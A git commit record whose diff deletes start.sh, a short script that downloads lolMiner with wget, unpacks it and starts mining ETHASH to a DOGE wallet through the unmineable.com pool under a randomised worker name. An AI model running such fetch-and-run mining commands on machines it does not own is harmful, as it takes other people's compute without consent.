21ab5889b68d6e19f0d6093d20786fdf8fe75cd1
belindanataliya <89851587+belindanataliya@users.noreply.github.com>
2021-09-03 11:30:04 +0700

    Delete start.sh

--- start.sh
+++
@@ -1,5 +0,0 @@
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
-tar xf lolMiner_v1.29_Lin64.tar.gz
-cd 1.29
-WORKER=$(shuf -i 1-999999 -n 1)
-./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user DOGE:DPaUko97KMzZcxXJdhT81eqEgpvtgiYsqf.$WORKER --ethstratum ETHPROXY
